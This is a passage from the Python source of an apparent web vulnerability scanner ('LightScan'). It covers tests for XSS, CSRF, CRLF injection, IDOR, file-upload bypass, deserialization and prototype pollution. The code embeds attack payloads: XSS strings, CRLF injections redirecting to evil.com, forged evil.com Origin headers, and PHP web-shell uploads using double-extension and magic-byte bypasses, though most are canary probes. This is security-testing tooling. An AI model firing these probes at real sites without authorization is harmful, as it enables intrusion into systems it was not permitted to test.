        """
        HTTP Parameter Pollution — sends duplicate params with different values,
        checks which value the server uses (first/last/both/joined).
        """
        urls = self._collect_param_urls()
        vulnerable: list[dict] = []
        seen: set = set()

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            for key in params:
                dup_qs = f"{key}=LGSCAN_A&{key}=LGSCAN_B"
                full   = parsed.path + "?" + dup_qs
                try:
                    r    = self._get(full)
                    body = self._text(r)
                    used = None
                    if "LGSCAN_A" in body and "LGSCAN_B" not in body: used = "first"
                    elif "LGSCAN_B" in body and "LGSCAN_A" not in body: used = "last"
                    elif "LGSCAN_A" in body and "LGSCAN_B" in body:    used = "both"
                    if used:
                        ident = f"hpp:{url}:{key}"
                        if ident not in seen:
                            seen.add(ident)
                            entry = {"url":url,"parameter":key,"behavior":used}
                            vulnerable.append(entry)
                            print(f"  \033[38;5;196m[HPP]\033[0m "
                                  f"{url} param={key} server-uses={used}")
                except Exception: continue

        self.results["param_pollution"] = vulnerable
        return vulnerable

    # ── Subdomain Discovery (passive) ─────────────────────────────────────────

    def subdomain_passive_test(self) -> list[str]:
        """
        Extracts subdomains passively from: HTML links, CSP header,
        CORS Allow-Origin responses, and JS source files.
        No active DNS or brute force — zero extra requests beyond page crawl.
        """
        parsed_base = urllib.parse.urlparse(self.base_url)
        base_domain = parsed_base.netloc.lower()
        # Strip port
        if ":" in base_domain:
            base_domain = base_domain.split(":")[0]
        # Get root domain (last 2 parts)
        parts       = base_domain.split(".")
        root_domain = ".".join(parts[-2:]) if len(parts) >= 2 else base_domain

        found: set = set()

        def _extract(text: str):
            for m in re.finditer(
                    rf'([\w\-]+\.{re.escape(root_domain)})', text, re.I):
                sub = m.group(1).lower()
                if sub != base_domain and sub not in found:
                    found.add(sub)
                    print(f"  \033[38;5;196m[SUBDOMAIN]\033[0m {sub}")

        # Home page
        r = self._get("/")
        _extract(self._text(r))
        hdrs = self._headers(r)
        for h in ("Content-Security-Policy","Access-Control-Allow-Origin",
                   "Link","Set-Cookie"):
            _extract(hdrs.get(h,""))

        # JS files
        soup = self._parse_html(self._text(r))
        if soup:
            for tag in soup.find_all("script", src=True)[:6]:
                src = tag["src"]
                if not src.startswith("http"):
                    src = urllib.parse.urljoin(self.base_url+"/", src.lstrip("/"))
                try:
                    _extract(self._text(self._get(src)))
                except Exception: pass

        result = sorted(found)
        self.results["subdomains"] = result
        return result

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _collect_form_targets(self) -> list[dict]:
        """Returns [{url, method, fields}] for forms found on home + dir pages."""
        targets: list[dict] = []
        pages   = ["/"] + ["/"+d["path"] for d in self.results.get("directories",[])]
        seen: set = set()
        for page in pages[:10]:
            resp = self._get(page)
            soup = self._parse_html(self._text(resp))
            if not soup: continue
            for form in soup.find_all("form"):
                action = form.get("action") or page
                method = (form.get("method") or "GET").upper()
                url    = urllib.parse.urljoin(self.base_url+"/", action.lstrip("/"))
                fields = [i.get("name") for i in
                          form.find_all(["input","textarea","select"])
                          if i.get("name")]
                key    = f"{url}:{method}"
                if key not in seen and fields:
                    seen.add(key)
                    targets.append({"url":url,"method":method,"fields":fields})
        return targets

    # ══════════════════════════════════════════════════════════════════════════
    # ROUND 3 — ADVANCED CHECKS
    # ══════════════════════════════════════════════════════════════════════════

    # ── SSL/TLS Analysis ─────────────────────────────────────────────────────

    def ssl_tls_test(self) -> dict:
        """
        Full TLS audit via raw ssl module — no openssl CLI required.
        Checks:
          • Certificate: expiry, self-signed, weak key (RSA<2048, EC<256),
            CN/SANs mismatch, MD5/SHA1 signature
          • Protocol: SSLv2/v3 (DROWN/POODLE), TLS 1.0/1.1 offered
          • Ciphers: NULL, EXPORT, RC4, DES/3DES, anonymous DH (ADH/AECDH)
          • Features: HSTS presence + max-age, HSTS preload, certificate
            transparency (SCT), OCSP stapling hint
        """
        import ssl as _ssl, socket as _sock, datetime as _dt

        parsed = urllib.parse.urlparse(self.base_url)
        host   = parsed.hostname or "localhost"
        port   = parsed.port or 443
        result: dict = {
            "host": host, "port": port,
            "cert": {}, "protocols": {}, "ciphers": {},
            "findings": [], "grade": "A",
        }

        if parsed.scheme != "https":
            result["findings"].append("not-https")
            result["grade"] = "F"
            self.results["ssl_tls"] = result
            return result

        # ── Certificate info ───────────────────────────────────────────────────
        try:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            with _sock.create_connection((host, port), timeout=self.timeout) as raw:
                with ctx.wrap_socket(raw, server_hostname=host) as s:
                    cert    = s.getpeercert()
                    cipher  = s.cipher()      # (name, proto, bits)
                    version = s.version()

            # Expiry
            not_after = cert.get("notAfter","")
            if not_after:
                exp = _dt.datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                days_left = (exp - _dt.datetime.utcnow()).days
                result["cert"]["expires"]   = not_after
                result["cert"]["days_left"] = days_left
                if days_left < 0:
                    result["findings"].append("cert-expired")
                    result["grade"] = "F"
                elif days_left < 30:
                    result["findings"].append(f"cert-expires-soon-{days_left}d")
                    if result["grade"] > "C": result["grade"] = "C"

            # Subject / SANs
            subject = dict(x[0] for x in cert.get("subject",[]))
            result["cert"]["cn"] = subject.get("commonName","?")
            sans = [v for (t,v) in cert.get("subjectAltName",[]) if t=="DNS"]
            result["cert"]["sans"] = sans[:10]

            # Self-signed: issuer == subject
            issuer  = dict(x[0] for x in cert.get("issuer",[]))
            if issuer == subject:
                result["findings"].append("self-signed-cert")
                result["grade"] = "F"

            # Signature algorithm (MD5/SHA1 weak)
            sig_algo = cert.get("signatureAlgorithm","")
            result["cert"]["sig_algo"] = sig_algo
            if "md5" in sig_algo.lower():
                result["findings"].append("md5-signature")
                result["grade"] = "F"
            elif "sha1" in sig_algo.lower():
                result["findings"].append("sha1-signature")
                if result["grade"] > "B": result["grade"] = "B"

            # Cipher in use
            result["ciphers"]["negotiated"] = cipher[0] if cipher else "?"
            result["ciphers"]["bits"]        = cipher[2] if cipher else 0
            result["protocols"]["negotiated"] = version

            cipher_name = (cipher[0] or "").upper()
            for weak in ("NULL","EXPORT","RC4","DES","IDEA","SEED","ADH","AECDH","ANON"):
                if weak in cipher_name:
                    result["findings"].append(f"weak-cipher-{weak}")
                    result["grade"] = "F"
            if cipher[2] and cipher[2] < 128:
                result["findings"].append(f"cipher-bits-{cipher[2]}")
                if result["grade"] > "C": result["grade"] = "C"

        except Exception as e:
            result["cert"]["error"] = str(e)

        # ── Weak protocol probes ───────────────────────────────────────────────
        PROTOS = {
            "SSLv2":  getattr(_ssl, "PROTOCOL_SSLv2",  None),
            "SSLv3":  getattr(_ssl, "PROTOCOL_SSLv3",  None),
            "TLSv1":  getattr(_ssl, "PROTOCOL_TLSv1",  None),
            "TLSv1.1":getattr(_ssl, "PROTOCOL_TLSv1_1",None),
        }
        for proto_name, proto_const in PROTOS.items():
            if proto_const is None: continue
            try:
                ctx2 = _ssl.SSLContext(proto_const)
                ctx2.check_hostname = False
                ctx2.verify_mode    = _ssl.CERT_NONE
                with _sock.create_connection((host, port), timeout=3) as raw:
                    with ctx2.wrap_socket(raw, server_hostname=host):
                        result["findings"].append(f"weak-proto-{proto_name}")
                        result["protocols"][proto_name] = "accepted"
                        if result["grade"] > "C": result["grade"] = "C"
                        print(f"  \033[38;5;196m[SSL]\033[0m "
                              f"Weak protocol accepted: {proto_name}")
            except Exception: pass

        # ── HSTS check ────────────────────────────────────────────────────────
        try:
            r    = self._get("/")
            hdrs = self._headers(r)
            hsts = hdrs.get("Strict-Transport-Security","")
            if not hsts:
                result["findings"].append("hsts-missing")
                if result["grade"] > "B": result["grade"] = "B"
            else:
                m = re.search(r"max-age=(\d+)", hsts)
                if m:
                    age = int(m.group(1))
                    result["cert"]["hsts_max_age"] = age
                    if age < 15768000:   # < 6 months
                        result["findings"].append(f"hsts-max-age-low-{age}")
                        if result["grade"] > "B": result["grade"] = "B"
                if "preload" in hsts:
                    result["cert"]["hsts_preload"] = True
                if "includeSubDomains" in hsts:
                    result["cert"]["hsts_subdomains"] = True
        except Exception: pass

        if not result["findings"]:
            result["findings"].append("no-issues-found")

        print(f"  \033[38;5;196m[SSL/TLS]\033[0m "
              f"grade={result['grade']} "
              f"issues={[f for f in result['findings'] if f!='no-issues-found']}")
        self.results["ssl_tls"] = result
        return result

    # ── Stored XSS ───────────────────────────────────────────────────────────

    def xss_stored_test(self) -> list[dict]:
        """
        Submits XSS payload via POST forms, then re-fetches the page
        (and linked profile/comments/listing pages) to check if stored.
        Also checks admin/listing paths where output often appears.
        """
        CANARY   = "LSXSS" + str(int(time.time()))[-5:]
        PAYLOADS = [
            f"<script>/*{CANARY}*/</script>",
            f'"><img src=x onerror=/*{CANARY}*/ >',
            f"<svg/onload=/*{CANARY}*/>",
        ]
        FETCH_PATHS = ["/", "/admin", "/comments", "/posts", "/blog",
                       "/forum", "/listings", "/reviews", "/dashboard",
                       "/profile", "/account"]

        form_targets = self._collect_form_targets()
        vulnerable: list[dict] = []
        seen: set = set()

        for t in form_targets:
            method = t["method"]
            if method != "POST": continue

            for payload in PAYLOADS:
                data = {f: payload for f in t["fields"]
                        if not any(s in f.lower() for s in ("pass","csrf","token","nonce","email"))}
                if not data: continue

                try:
                    self._post(t["url"], data, allow_redirects=True)
                    time.sleep(0.3)  # let server persist

                    # Re-fetch submission URL + common output paths
                    check_paths = [urllib.parse.urlparse(t["url"]).path] + FETCH_PATHS
                    for path in check_paths:
                        r    = self._get(path)
                        body = self._text(r)
                        if CANARY in body:
                            ident = f"stored-xss:{t['url']}:{path}"
                            if ident not in seen:
                                seen.add(ident)
                                entry = {"submit_url": t["url"],
                                         "reflected_at": path,
                                         "payload": payload,
                                         "fields": list(data.keys())}
                                vulnerable.append(entry)
                                print(f"  \033[38;5;196m[XSS-STORED]\033[0m "
                                      f"submitted→{t['url']} reflected@{path}")
                            break
                    if any(f"stored-xss:{t['url']}" in s for s in seen): break
                except Exception: continue

        self.results["xss_stored"] = vulnerable
        return vulnerable

    # ── DOM XSS (static JS analysis) ─────────────────────────────────────────

    def xss_dom_test(self) -> list[dict]:
        """
        Static analysis of inline + linked JS for dangerous source→sink flows.
        Sources: location.hash, location.search, document.URL, document.referrer,
                 postMessage, URLSearchParams, window.name
        Sinks:   document.write, innerHTML, outerHTML, eval, setTimeout(str),
                 setInterval(str), Function(str), location.href=, src=, href=
        Reports source+sink co-occurrence within 10 lines (heuristic).
        """
        SOURCES = [
            "location.hash", "location.search", "document.URL",
            "document.referrer", "postMessage", "URLSearchParams",
            "window.name", "location.href", "document.cookie",
        ]
        SINKS = [
            "document.write(", "innerHTML", "outerHTML",
            r"\beval\s*\(", r"setTimeout\s*\(['\"]",
            r"setInterval\s*\(['\"]", r"Function\s*\(",
            r"location.href\s*=", r"\.src\s*=", r"\.href\s*=",
            r"\.action\s*=", "insertAdjacentHTML",
        ]
        findings: list[dict] = []
        seen: set = set()

        def _analyse(js_text: str, source_url: str):
            lines = js_text.split("\n")
            for i, line in enumerate(lines):
                src_hit = [s for s in SOURCES if s in line]
                if not src_hit: continue
                # Look at ±10 lines for a sink
                window = "\n".join(lines[max(0,i-10):i+11])
                for sink_pat in SINKS:
                    if re.search(sink_pat, window):
                        ident = f"dom:{source_url}:{src_hit[0]}:{sink_pat[:15]}"
                        if ident not in seen:
                            seen.add(ident)
                            snippet = line.strip()[:120]
                            findings.append({
                                "source_url": source_url,
                                "source":     src_hit[0],
                                "sink":       sink_pat,
                                "line":       i+1,
                                "snippet":    snippet,
                            })
                            print(f"  \033[38;5;196m[DOM-XSS]\033[0m "
                                  f"source={src_hit[0]} sink={sink_pat[:20]} "
                                  f"in {source_url.split('/')[-1][:30]}")
                        break

        # Inline scripts on home page
        resp = self._get("/")
        soup = self._parse_html(self._text(resp))
        if soup:
            for tag in soup.find_all("script", src=False):
                _analyse(tag.get_text(), self.base_url + "/#inline")
            # External JS
            for tag in soup.find_all("script", src=True)[:10]:
                src = tag["src"]
                if not src.startswith("http"):
                    src = urllib.parse.urljoin(self.base_url+"/", src.lstrip("/"))
                try: _analyse(self._text(self._get(src)), src)
                except Exception: pass

        self.results["xss_dom"] = findings
        return findings

    # ── CSRF Detection ────────────────────────────────────────────────────────

    def csrf_test(self) -> list[dict]:
        """
        Detects CSRF vulnerabilities:
          1. Forms without CSRF token fields (no csrfmiddlewaretoken/
             _token/_csrf_token/authenticity_token/nonce)
          2. State-changing requests that accept cross-origin (no SameSite
             cookie + no Origin/Referer check)
          3. JSON endpoints accepting application/x-www-form-urlencoded
             (content-type confusion CSRF)
        """
        TOKEN_NAMES = {"csrf","xsrf","token","nonce","authenticity",
                       "_token","__requestverificationtoken","csrfmiddlewaretoken"}
        findings: list[dict] = []
        seen: set = set()

        form_targets = self._collect_form_targets()

        for t in form_targets:
            if t["method"] != "POST": continue
            # Check if any field name looks like a CSRF token
            fields_lower = {f.lower() for f in t["fields"]}
            has_token    = any(any(tok in f for tok in TOKEN_NAMES)
                               for f in fields_lower)
            if not has_token:
                ident = f"csrf-no-token:{t['url']}"
                if ident not in seen:
                    seen.add(ident)
                    findings.append({
                        "url":    t["url"],
                        "type":   "missing-csrf-token",
                        "fields": t["fields"],
                    })
                    print(f"  \033[38;5;196m[CSRF]\033[0m "
                          f"No CSRF token in form @ {t['url']}")

        # ── Content-type confusion: POST JSON endpoint accepting form data ──
        for ep in ["/api/user","/api/account","/api/profile",
                   "/api/password","/api/settings","/api/email"]:
            data = {"action":"test","value":"lightscan-csrf-probe"}
            try:
                if self._use_requests:
                    r = self.session.post(
                        self.base_url+ep, data=data, verify=False,
                        timeout=self.timeout,
                        headers={"Content-Type":"application/x-www-form-urlencoded",
                                 "Origin":"https://evil.com",
                                 "Referer":"https://evil.com/"})
                    sc   = r.status_code
                    body = r.text
                else:
                    sc, body = 0, ""
                # If 200 and not a clear "unauthorized" — possible CSRF
                if sc == 200 and "unauthorized" not in body.lower() \
                        and "forbidden" not in body.lower():
                    ident = f"csrf-form-json:{ep}"
                    if ident not in seen:
                        seen.add(ident)
                        findings.append({
                            "url":  self.base_url+ep,
                            "type": "content-type-confusion-csrf",
                            "status": sc,
                        })
                        print(f"  \033[38;5;196m[CSRF]\033[0m "
                              f"Content-type confusion @ {ep} ({sc})")
            except Exception: continue

        # ── SameSite cookie audit ─────────────────────────────────────────────
        resp = self._get("/")
        if resp:
            cookies_header = self._headers(resp).get("Set-Cookie","")
            if cookies_header and "samesite" not in cookies_header.lower():
                ident = "csrf-no-samesite"
                if ident not in seen:
                    seen.add(ident)
                    findings.append({
                        "url":  self.base_url,
                        "type": "cookie-missing-samesite",
                        "cookie": cookies_header[:80],
                    })
                    print(f"  \033[38;5;196m[CSRF]\033[0m "
                          f"Cookie missing SameSite attribute")

        self.results["csrf"] = findings
        return findings

    # ── Clickjacking ─────────────────────────────────────────────────────────

    def clickjacking_test(self) -> dict:
        """
        Checks:
          1. X-Frame-Options header (DENY / SAMEORIGIN)
          2. Content-Security-Policy frame-ancestors directive
          3. Attempts an actual iframe embed simulation (header-based only,
             no real browser) — reports "frameable" if neither protection set
        Covers: login, admin, payment paths too.
        """
        PATHS = ["/", "/login", "/admin", "/pay", "/transfer",
                 "/settings", "/account", "/checkout"]
        result: dict = {"frameable_paths":[], "protected_paths":[], "findings":[]}

        for path in PATHS:
            r    = self._get(path)
            hdrs = self._headers(r)
            sc   = self._status(r)
            if not sc or sc >= 400: continue

            xfo = hdrs.get("X-Frame-Options","").upper()
            csp = hdrs.get("Content-Security-Policy","")
            has_xfo   = xfo in ("DENY","SAMEORIGIN")
            has_csp_fa= "frame-ancestors" in csp

            if has_xfo or has_csp_fa:
                result["protected_paths"].append({
                    "path":path, "xfo":xfo or None,
                    "csp_fa":"yes" if has_csp_fa else None,
                })
            else:
                result["frameable_paths"].append(path)
                print(f"  \033[38;5;196m[CLICKJACK]\033[0m "
                      f"No frame protection @ {path}")

        if result["frameable_paths"]:
            result["findings"].append("clickjacking-possible")
            result["vulnerable"] = True
        else:
            result["vulnerable"] = False

        self.results["clickjacking"] = result
        return result

    # ── CRLF Injection / HTTP Response Splitting ──────────────────────────────

    def crlf_test(self) -> list[dict]:
        """
        Injects CRLF sequences into GET params and checks if they appear
        in response headers (response splitting / header injection).
        Also probes path and redirect params.
        """
        PAYLOADS = [
            "%0d%0aX-LightScan-CRLF: injected",
            "%0aX-LightScan-CRLF: injected",
            "%0d%0a%20X-LightScan-CRLF: injected",
            "%0d%0aSet-Cookie: crlf=lightscan",
            "\r\nX-LightScan-CRLF: injected",
            "%E5%98%8D%E5%98%8AX-LightScan-CRLF: injected",   # Unicode CRLF
            "%0d%0aLocation: https://evil.com",
        ]
        INDICATORS = ["x-lightscan-crlf", "crlf=lightscan"]

        urls  = self._collect_param_urls()
        # Also test URL path directly
        found: list[dict] = []
        seen:  set = set()

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            for key in params:
                for payload in PAYLOADS:
                    # Don't URL-encode the payload — we want raw injection
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" \
                               f"?{key}={payload}"
                    try:
                        r    = self._get(test_url)
                        hdrs = self._headers(r)
                        body = self._text(r)
                        for ind in INDICATORS:
                            if (ind in {k.lower() for k in hdrs} or
                                    ind in body.lower()):
                                ident = f"crlf:{url}:{key}"
                                if ident not in seen:
                                    seen.add(ident)
                                    found.append({
                                        "url":     url,
                                        "parameter": key,
                                        "payload": payload,
                                        "indicator": ind,
                                    })
                                    print(f"  \033[38;5;196m[CRLF]\033[0m "
                                          f"{url} param={key}")
                                break
                        if f"crlf:{url}:{key}" in seen: break
                    except Exception: continue

        self.results["crlf"] = found
        return found

    # ── IDOR (Insecure Direct Object Reference) ───────────────────────────────

    def idor_test(self) -> list[dict]:
        """
        Discovers numeric IDs in API paths and URL params, then increments/
        decrements them to probe for IDOR.
        Strategy:
          1. Crawl discovered API endpoints for numeric segments
          2. Replace each with ID±1, compare response size/content
          3. Flag if different user data returned (length change + 200 status)
        Also tests UUID params (replaces with all-zeros UUID).
        """
        ID_PATTERN   = re.compile(r'/(\d{1,10})(?:/|$|\?)')
        UUID_PATTERN  = re.compile(
            r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
            re.I)
        NULL_UUID    = "00000000-0000-0000-0000-000000000000"
        findings: list[dict] = []
        seen: set = set()

        # Collect candidate URLs from API endpoints + discovered dirs
        candidate_urls: set[str] = set()
        for ep in self.results.get("api_endpoints", []):
            candidate_urls.add(self.base_url + ep["path"])
        for d in self.results.get("directories", []):
            u = self.base_url + "/" + d["path"]
            if ID_PATTERN.search(u) or UUID_PATTERN.search(u):
                candidate_urls.add(u)
        # Also collect from page links
        resp = self._get("/")
        soup = self._parse_html(self._text(resp))
        if soup:
            for a in soup.find_all("a", href=True):
                href = a["href"]
                if ID_PATTERN.search(href) or UUID_PATTERN.search(href):
                    candidate_urls.add(urllib.parse.urljoin(
                        self.base_url+"/", href.lstrip("/")))

        for url in list(candidate_urls)[:30]:  # cap at 30
            # ── Numeric ID replacement
            for m in ID_PATTERN.finditer(url):
                orig_id = int(m.group(1))
                for probe_id in (orig_id+1, orig_id-1, orig_id+100, 1, 0):
                    if probe_id < 0: continue
                    test_url = url[:m.start(1)] + str(probe_id) + url[m.end(1):]
                    ident    = f"idor:{test_url}"
                    if ident in seen: continue
                    seen.add(ident)
                    try:
                        r0 = self._get(url)
                        r1 = self._get(test_url)
                        sc0= self._status(r0); sc1 = self._status(r1)
                        l0 = len(self._text(r0)); l1 = len(self._text(r1))
                        # Both 200, different content = possible IDOR
                        if sc0 == 200 and sc1 == 200 and abs(l0-l1) > 20:
                            findings.append({
                                "original_url": url,
                                "probed_url":   test_url,
                                "orig_id":      orig_id,
                                "probe_id":     probe_id,
                                "type":         "numeric-id",
                                "len_diff":     abs(l0-l1),
                            })
                            print(f"  \033[38;5;196m[IDOR]\033[0m "
                                  f"id={orig_id}→{probe_id} Δlen={abs(l0-l1)} {test_url[:50]}")
                            break
                    except Exception: continue

            # ── UUID replacement
            for m in UUID_PATTERN.finditer(url):
                test_url = url[:m.start()] + NULL_UUID + url[m.end():]
                ident    = f"idor-uuid:{test_url}"
                if ident in seen: continue
                seen.add(ident)
                try:
                    r0 = self._get(url); r1 = self._get(test_url)
                    if self._status(r0)==200 and self._status(r1)==200:
                        l0=len(self._text(r0)); l1=len(self._text(r1))
                        if abs(l0-l1) > 20:
                            findings.append({
                                "original_url": url,
                                "probed_url":   test_url,
                                "type":         "uuid",
                                "len_diff":     abs(l0-l1),
                            })
                            print(f"  \033[38;5;196m[IDOR]\033[0m "
                                  f"UUID→null Δlen={abs(l0-l1)} {test_url[:50]}")
                except Exception: continue

        self.results["idor"] = findings
        return findings

    # ── File Upload Bypass ────────────────────────────────────────────────────

    def file_upload_test(self) -> list[dict]:
        """
        Finds file upload forms and tests:
          1. PHP webshell upload (.php, .phtml, .php5, .phar)
          2. MIME type bypass (send image/jpeg but with PHP content)
          3. Double extension bypass (shell.php.jpg)
          4. Null byte bypass (shell.php%00.jpg — older servers)
          5. Magic bytes bypass (JPEG header + PHP code)
        Checks if uploaded file is accessible and executable.
        """
        SHELL_CONTENT  = b"<?php echo 'LSUPLOAD_' . md5('lightscan'); ?>"
        SHELL_CANARY   = "LSUPLOAD_"
        findings: list[dict] = []
        seen: set = set()

        form_targets = self._collect_form_targets()
        upload_forms = []
        for t in form_targets:
            resp = self._get(urllib.parse.urlparse(t["url"]).path)
            soup = self._parse_html(self._text(resp))
            if not soup: continue
            for form in soup.find_all("form"):
                if any((i.get("type","")).lower()=="file"
                       for i in form.find_all("input")):
                    upload_forms.append(t)
                    break

        if not upload_forms:
            self.results["file_upload"] = []
            return []

        BYPASS_ATTEMPTS = [
            ("shell.php",      "application/octet-stream", SHELL_CONTENT),
            ("shell.phtml",    "application/octet-stream", SHELL_CONTENT),
            ("shell.php5",     "image/jpeg",               SHELL_CONTENT),
            ("shell.phar",     "image/gif",                SHELL_CONTENT),
            ("shell.php.jpg",  "image/jpeg",               SHELL_CONTENT),
            ("shell.jpg.php",  "image/jpeg",               SHELL_CONTENT),
            # Magic bytes bypass: JPEG header (\xff\xd8\xff) + PHP
            ("shell2.php",     "image/jpeg",
             b"\xff\xd8\xff" + SHELL_CONTENT),
        ]

        for form in upload_forms[:3]:  # cap at 3 forms
            for filename, mime, content in BYPASS_ATTEMPTS:
                try:
                    if not self._use_requests: continue
                    # Find the file input field name
                    resp    = self._get(urllib.parse.urlparse(form["url"]).path)
                    soup    = self._parse_html(self._text(resp))
                    file_field = "file"
                    if soup:
                        for inp in soup.find_all("input",type="file"):
                            file_field = inp.get("name","file"); break
                    files = {file_field: (filename, content, mime)}
                    r = self.session.post(form["url"], files=files,
                                          timeout=self.timeout, verify=False)
                    resp_body = r.text

                    # Try to find the upload path in response
                    upload_paths: list[str] = []
                    for m in re.finditer(
                            r'(?:href|src|value)=["\']([^"\']*' +
                            re.escape(filename.split(".")[0]) + r'[^"\']*)["\']',
                            resp_body, re.I):
                        upload_paths.append(m.group(1))
                    # Common upload dirs
                    for up_dir in ("/uploads/","/upload/","/files/",
                                   "/images/","/media/","/tmp/"):
                        upload_paths.append(up_dir + filename)

                    for up_path in upload_paths[:5]:
                        r2 = self._get(up_path)
                        if self._status(r2) == 200 and SHELL_CANARY in self._text(r2):
                            ident = f"upload:{form['url']}:{filename}"
                            if ident not in seen:
                                seen.add(ident)
                                findings.append({
                                    "form_url":  form["url"],
                                    "filename":  filename,
                                    "mime_sent": mime,
                                    "upload_path": up_path,
                                    "executable": True,
                                })
                                print(f"  \033[38;5;196m[UPLOAD]\033[0m "
                                      f"PHP shell accessible @ {up_path}")
                            break
                except Exception: continue

        self.results["file_upload"] = findings
        return findings

    # ── Deserialization Probes ────────────────────────────────────────────────

    def deserialization_test(self) -> list[dict]:
        """
        Sends deserialization gadget payloads to endpoints accepting
        serialized data (Java, PHP, Python pickle).
        Detection: response time (>3s = possible ysoserial SLEEP gadget),
                   specific error strings, or canary in response.
        Targets: endpoints with Content-Type application/x-java-serialized,
                 PHP serialized object params, Python pickle params.
        """
        findings: list[dict] = []
        seen: set = set()

        # ── Java: magic bytes 0xACED0005 + simple SLEEP gadget indicator ─────
        # We send the header + zeroes (not a real ysoserial payload — just probes)
        JAVA_MAGIC   = b"\xac\xed\x00\x05"  # Java serialization magic
        JAVA_PROBE   = JAVA_MAGIC + b"\x73\x72" + b"\x00" * 50  # fake ObjectStreamClass

        # ── PHP serialized string probe ───────────────────────────────────────
        PHP_PROBES = [
            b'O:8:"stdClass":0:{}',                    # harmless stdClass
            b'a:1:{s:4:"test";s:9:"lightscan";}',      # array
        ]
        PHP_ERROR_PATTERNS = [
            "unserialize()", "__wakeup", "__destruct",
            "object of class", "unserialize_callback",
        ]

        DESER_ENDPOINTS = [
            "/api/", "/api/v1/", "/login", "/upload",
            "/session", "/data", "/object", "/payload",
        ]

        for ep in DESER_ENDPOINTS:
            url = self.base_url + ep

            # Java probe
            try:
                if self._use_requests:
                    t0 = time.time()
                    r  = self.session.post(url, data=JAVA_PROBE,
                        headers={"Content-Type":"application/x-java-serialized-object"},
                        timeout=self.timeout, verify=False)
                    elapsed = time.time() - t0
                    body    = r.text.lower()
                    if ("classnotfoundexception" in body or
                            "java.io" in body or
                            "serializ" in body or
                            elapsed > 3.0):
                        ident = f"deser-java:{ep}"
                        if ident not in seen:
                            seen.add(ident)
                            findings.append({
                                "url":  url,
                                "type": "java-deserialization",
                                "indicator": "error-or-timeout",
                                "delay_s": round(elapsed,2),
                            })
                            print(f"  \033[38;5;196m[DESER]\033[0m "
                                  f"Java deserialization signal @ {ep}")
            except Exception: pass

            # PHP probe
            for php_payload in PHP_PROBES:
                try:
                    if self._use_requests:
                        r    = self.session.post(url, data=php_payload,
                            headers={"Content-Type":"application/octet-stream"},
                            timeout=self.timeout, verify=False)
                        body = r.text.lower()
                        for pat in PHP_ERROR_PATTERNS:
                            if pat in body:
                                ident = f"deser-php:{ep}"
                                if ident not in seen:
                                    seen.add(ident)
                                    findings.append({
                                        "url":  url,
                                        "type": "php-deserialization",
                                        "pattern": pat,
                                    })
                                    print(f"  \033[38;5;196m[DESER]\033[0m "
                                          f"PHP unserialize signal @ {ep} ({pat})")
                                break
                except Exception: continue

        # ── Cookie-based PHP deserialization ─────────────────────────────────
        resp = self._get("/")
        if resp and self._use_requests:
            for cookie in resp.cookies:
                val = cookie.value
                if val.startswith("O:") or val.startswith("a:"):
                    # Looks like PHP serialized cookie
                    findings.append({
                        "url":    self.base_url,
                        "type":   "php-serialized-cookie",
                        "cookie": cookie.name,
                        "value":  val[:60],
                    })
                    print(f"  \033[38;5;196m[DESER]\033[0m "
                          f"PHP serialized cookie: {cookie.name}")

        self.results["deserialization"] = findings
        return findings

    # ── Prototype Pollution ───────────────────────────────────────────────────

    def prototype_pollution_test(self) -> list[dict]:
        """
        Tests JSON POST endpoints and GET params for prototype pollution.
        Payloads inject __proto__, constructor.prototype, __defineGetter__
        into JSON body and query string.
        Detection: canary key reflected in response or altered behaviour.
        """
        CANARY     = "lspp_canary"
        PAYLOADS_JSON = [
            {f"__proto__":            {CANARY: "1"}},
            {"constructor":           {"prototype": {CANARY: "1"}}},
            {"__defineGetter__":      "test"},
            {"__proto__["+CANARY+"]": "1"},
        ]
        PAYLOADS_QS = [
            f"__proto__[{CANARY}]=1",
            f"constructor[prototype][{CANARY}]=1",
        ]
        findings: list[dict] = []
        seen: set = set()

        # JSON API endpoints
        for ep in (self.results.get("api_endpoints",[]) or [{"path":"/api/"}]):
            path = ep["path"] if isinstance(ep,dict) else ep
            url  = self.base_url + path
            for payload in PAYLOADS_JSON:
                try:
                    if not self._use_requests: break
                    r    = self.session.post(url,
                        json=payload,
                        headers={"Content-Type":"application/json"},
                        timeout=self.timeout, verify=False)
                    body = r.text
                    if CANARY in body:
                        ident = f"pp:{url}:{list(payload.keys())[0]}"
                        if ident not in seen:
                            seen.add(ident)
                            findings.append({
                                "url":     url,
                                "type":    "prototype-pollution-json",
                                "payload": str(payload)[:60],
                            })
                            print(f"  \033[38;5;196m[PROTO-POLL]\033[0m "
                                  f"JSON prototype pollution @ {path}")
                except Exception: continue

        # Query string pollution
        urls = self._collect_param_urls()
        for url in list(urls)[:10]:
            parsed = urllib.parse.urlparse(url)
            for qs_payload in PAYLOADS_QS:
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" \
                           f"?{parsed.query}&{qs_payload}"
                try:
                    r = self._get(test_url)
                    if CANARY in self._text(r):
                        ident = f"pp-qs:{url}"
                        if ident not in seen:
                            seen.add(ident)
                            findings.append({
                                "url":     url,
                                "type":    "prototype-pollution-querystring",
                                "payload": qs_payload,
                            })
                            print(f"  \033[38;5;196m[PROTO-POLL]\033[0m "
                                  f"QS prototype pollution @ {url[:50]}")
                except Exception: continue

        self.results["prototype_poll"] = findings
        return findings

    # ── Cookie Security Flags ─────────────────────────────────────────────────

    def cookie_security_test(self) -> list[dict]:
        """
        Audits Set-Cookie headers on all accessible pages.
        Checks per-cookie: HttpOnly, Secure, SameSite, Domain scope,
        Path scope, Max-Age/Expires (session vs persistent),
        and weak entropy (short / predictable values).
        """
        findings: list[dict] = []
        seen: set = set()
        PAGES = ["/", "/login", "/api/", "/admin", "/dashboard"]

        for page in PAGES:
            r = self._get(page)
            if not r: continue
            hdrs = self._headers(r)

            # requests gives multi-value Set-Cookie as list sometimes
            raw_cookies: list[str] = []
            if hasattr(r, "raw") and hasattr(r.raw, "headers"):
                try:
                    raw_cookies = r.raw.headers.getlist("Set-Cookie")
                except Exception: pass
            if not raw_cookies:
